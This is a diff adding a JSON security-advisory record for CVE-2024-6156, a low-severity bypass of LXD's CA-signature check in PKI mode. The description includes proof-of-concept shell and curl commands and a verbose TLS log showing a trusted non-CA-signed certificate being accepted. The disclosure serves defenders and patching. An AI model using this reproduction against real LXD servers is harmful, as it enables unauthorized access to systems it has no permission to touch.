@@ -1,0 +1,62 @@
+{
+  "Severity": "LOW",
+  "UpdatedAt": "2024-12-09T23:26:17Z",
+  "Package": {
+    "Ecosystem": "GO",
+    "Name": "github.com/canonical/lxd"
+  },
+  "Advisory": {
+    "DatabaseId": 271195,
+    "Id": "GSA_kwCzR0hTQS00YzQ5LTlmcGMtaGMzds4ABCNb",
+    "GhsaId": "GHSA-4c49-9fpc-hc3v",
+    "References": [
+      {
+        "Url": "https://github.com/canonical/lxd/security/advisories/GHSA-4c49-9fpc-hc3v"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2024-6156"
+      },
+      {
+        "Url": "https://github.com/canonical/lxd/commit/92468bb60f4f1edf38ff0434414bea4f28afa711"
+      },
+      {
+        "Url": "https://www.cve.org/CVERecord?id=CVE-2024-6156"
+      },
+      {
+        "Url": "https://pkg.go.dev/vuln/GO-2024-3312"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-4c49-9fpc-hc3v"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-4c49-9fpc-hc3v"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2024-6156"
+      }
+    ],
+    "Description": "### Summary\nIf a `server.ca` file is present in `LXD_DIR` at LXD start up, LXD is in \"PKI mode\". In this mode, only TLS clients that have a CA-signed certificate should be able to authenticate with LXD.\n\nWe have discovered that if a client that sends a non-CA signed certificate during the TLS handshake, that client is able to authenticate with LXD if their certificate is present in the trust store.\n    - The LXD Go client (and by extension `lxc`) does not send non-CA signed certificates during the handshake.\n    - A manual client (e.g. `cURL`) might send a non-CA signed certificate during the handshake.\n\n#### Versions affected\nLXD 4.0 and above.\n\n### Details\nWhen PKI mode was added to LXD it was intended that all client and server certificates *must* be signed by the certificate authority (see https://github.com/canonical/lxd/pull/2070/commits/84d917bdcca6fe1e3191ce47f1597c7d094e1909). \n\nIn PKI mode, the TLS listener configuration is altered to add the CA certificate but the `ClientAuth` field of `tls.Config` is not changed. The `ClientAuth` field is set to `tls.RequestClientCert`, which configures the TLS connection to request a certificate from the client, but not require one. This is necessary because untrusted requests are allowed for some endpoints.\n\nIf a client certificate is present in the trust store before PKI mode is enabled, calls to LXD using that certificate fail *when using the Go client for LXD*. I believe that what is happening is as follows:\n- During the TLS handshake, the server requests a certificate from the client. The server includes in it's request a list of acceptable CAs.\n- The go client receives the request from the server, but does not have any certificates that match what the server requires, and so does not send any.\n- The server considers the handshake complete because it does not absolutely require the client certificate (see above).\n- In the `(*Daemon).Authenticate` method, when checking for TLS clients, there are no `PeerCertificates` in the request. So `util.CheckTrustState` is never called and the request is denied.\n\nImportantly, the above does not apply if the client sends a certificate during the handshake anyway. If this occurs and the certificate is present in the trust store, the request is trusted and is allowed to continue. It is possible to do this using cURL*.\n\n### PoC\nThe follow snippet demonstrates the vulnerability:\n\n```\n# Install/initialize LXD\n$ snap install lxd --channel 5.21/stable\n$ lxd init --auto\n$ lxc config set core.https_address=127.0.0.1:8443\n\n# Add a certificate to the trust store before enabling PKI.\n$ token=\"$(lxc config trust add --name ca-test --quiet)\"\n$ lxc remote add tls \"${token}\"\n\n# Use easyrsa for configuring CA: https://github.com/OpenVPN/easy-rsa\n$ cp -R /usr/share/easy-rsa \"/tmp/pki\"\n$ export EASYRSA_KEY_SIZE=4096\n$ cd /tmp/pki\n$ ./easyrsa init-pki\n$ echo \"lxd\" | ./easyrsa build-ca nopass\n$ cp pki/ca.crt /var/snap/lxd/common/lxd/server.ca\n\n# Restart daemon.\n$ systemctl reload snap.lxd.daemon\n\n# Using curl with the client certificate we expect a 403 Forbidden response.\n# Instead we get a 200 OK and we are able to view the response body.\n$ cat ~/snap/lxd/common/config/client.crt ~/snap/lxd/common/config/client.key \u003e ~/snap/lxd/common/config/client.pem\n$ curl -s --cert ~/snap/lxd/common/config/client.pem --cacert /var/snap/lxd/common/lxd/server.crt https://127.0.0.1:8443/1.0\" | jq '.metadata.config.\"core.https_address\"'\n```\n### Impact\n\nI believe this has a low impact for the following reasons:\n* PKI mode is unlikely to have a large user base.\n* PKI is likely to be configured at start up without any previous certificates in the trust store.\n* Authentication is not bypassed entirely, the client certificate must already be trusted.\n\n### Notes\n* I am not certain why cURL sends the certificate during the handshake but we can see it in the logs:\n```\n*   Trying 127.0.0.1:8443...\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 127.0.0.1 (127.0.0.1) port 8443 (#0)\n* ALPN, offering h2\n* ALPN, offering http/1.1\n*  CAfile: /var/lib/lxd/server.crt\n*  CApath: /etc/ssl/certs\n* TLSv1.0 (OUT), TLS header, Certificate Status (22):\n} [5 bytes data]\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\n} [512 bytes data]\n  0     0    0     0    0     0      0      0 --:--:--  0:00:03 --:--:--     0* TLSv1.2 (IN), TLS header, Certificate Status (22):\n{ [5 bytes data]\n* TLSv1.3 (IN), TLS handshake, Server hello (2):\n{ [122 bytes data]\n* TLSv1.2 (IN), TLS header, Finished (20):\n{ [5 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):\n{ [15 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* TLSv1.3 (IN), TLS handshake, Request CERT (13):\n{ [69 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* TLSv1.3 (IN), TLS handshake, Certificate (11):\n{ [496 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* TLSv1.3 (IN), TLS handshake, CERT verify (15):\n{ [111 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* TLSv1.3 (IN), TLS handshake, Finished (20):\n{ [36 bytes data]\n* TLSv1.2 (OUT), TLS header, Finished (20):\n} [5 bytes data]\n* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):\n} [1 bytes data]\n* TLSv1.2 (OUT), TLS header, Supplemental data (23):\n} [5 bytes data]\n* TLSv1.3 (OUT), TLS handshake, Certificate (11):         \u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c\u003c HERE\n} [455 bytes data]\n* TLSv1.2 (OUT), TLS header, Supplemental data (23):\n} [5 bytes data]\n* TLSv1.3 (OUT), TLS handshake, CERT verify (15):\n} [111 bytes data]\n* TLSv1.2 (OUT), TLS header, Supplemental data (23):\n} [5 bytes data]\n* TLSv1.3 (OUT), TLS handshake, Finished (20):\n} [36 bytes data]\n* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256\n* ALPN, server accepted to use h2\n* Server certificate:\n*  subject: O=LXD; CN=root@RUBIX\n*  start date: Apr  2 15:27:39 2024 GMT\n*  expire date: Mar 31 15:27:39 2034 GMT\n*  subjectAltName: host \"127.0.0.1\" matched cert's IP address!\n*  issuer: O=LXD; CN=root@RUBIX\n*  SSL certificate verify ok.\n* Using HTTP2, server supports multiplexing\n* Connection state changed (HTTP/2 confirmed)\n* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0\n* TLSv1.2 (OUT), TLS header, Supplemental data (23):\n} [5 bytes data]\n* TLSv1.2 (OUT), TLS header, Supplemental data (23):\n} [5 bytes data]\n* TLSv1.2 (OUT), TLS header, Supplemental data (23):\n} [5 bytes data]\n* Using Stream ID: 1 (easy handle 0x601ce9c4feb0)\n* TLSv1.2 (OUT), TLS header, Supplemental data (23):\n} [5 bytes data]\n\u003e GET /1.0 HTTP/2\n\u003e Host: 127.0.0.1:8443\n\u003e user-agent: curl/7.81.0\n\u003e accept: */*\n\u003e \n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):\n{ [569 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* Connection state changed (MAX_CONCURRENT_STREAMS == 250)!\n* TLSv1.2 (OUT), TLS header, Supplemental data (23):\n} [5 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n\u003c HTTP/2 200 \n\u003c content-type: application/json\n\u003c etag: \"a1147bd1cd26e0b98e4c4400be3c17d5de3d865a045b6e609c6a8ee1aba8c1a1\"\n\u003c date: Mon, 17 Jun 2024 21:25:46 GMT\n\u003c \n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n* TLSv1.2 (IN), TLS header, Supplemental data (23):\n{ [5 bytes data]\n100 11659    0 11659    0     0   3401      0 --:--:--  0:00:03 --:--:--  3402\n* Connection #0 to host 127.0.0.1 left intact\n```",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2024-12-09T23:26:16Z",
+    "Severity": "LOW",
+    "Summary": "lxd CA certificate sign check bypass",
+    "UpdatedAt": "2024-12-11T21:16:18Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 3.8,
+      "VectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.0.0-20240708073652-5a492a3f0036"
+      },
+      "VulnerableVersionRange": "\u003c 0.0.0-20240708073652-5a492a3f0036"
+    }
+  ]
+}
